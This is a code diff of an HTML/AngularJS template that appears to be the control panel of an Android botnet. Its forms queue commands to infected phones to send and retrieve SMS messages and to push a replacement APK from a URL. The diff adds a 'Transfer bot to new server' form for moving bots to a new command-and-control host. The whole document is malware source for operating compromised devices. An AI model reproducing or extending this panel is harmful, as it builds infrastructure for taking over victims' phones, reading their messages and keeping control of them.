@@ -22,7 +22,7 @@
         <form name="sendSmsForm">
           <div class="form-group" ng-class="">
             <label>Text message</label>
-            <textarea class="form-control" ng-model="text_message" name="text_message" rows="10" required=""></textarea>
+            <textarea class="form-control" ng-model="text_message" name="text_message" rows="5" required=""></textarea>
           </div>
           <div class="form-group" ng-class="">
             <label>Send to number</label>
@@ -42,7 +42,7 @@
           </div>
           <div class="form-group">
             <button type="submit" ng-disabled="smsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getsms', numbersms)">Get SMS</button>
-            <a class="btn btn-danger" ng-click="clearSMS()">Clear History</a>
+            <a class="btn btn-danger" ng-click="clearSMS()">Clear List</a>
           </div>
         </form>
         <hr>
@@ -128,13 +128,23 @@
     </div>
   </uib-tab>
   <uib-tab index="6" heading="Settings">
-    <form name="updateForm">
-      <div class="form-group" ng-class="">
-        <label>URL of the new apk</label>
-        <input class="form-control" type="text" name="url" ng-model="update_url" required>
+    <form name="updateApkForm">
+      <div class="form-group ">
+        <label>Update APK</label>
+        <input placeholder="URL of new APK" class=" form-control" type="url" name="apkUrl" ng-model="update_url" required>
       </div>
       <div class="form-group">
-        <button ng-disabled="updateForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">Update APK</button>
+        <button ng-disabled="updateApkForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">Update APK</button>
+      </div>
+    </form>
+    <hr>
+    <form name="transferBotForm">
+      <div class="form-group ">
+        <label>Transfer bot to new server</label>
+        <input class=" form-control" placeholder="URL of new server" type="url" name="apkUrl" ng-model="server_url" required>
+      </div>
+      <div class="form-group">
+        <button ng-disabled="transferBotForm.$invalid" class="btn btn-primary" ng-click="addCommand('transferbot', server_url)">Transfer Bot</button>
       </div>
     </form>
     <hr>
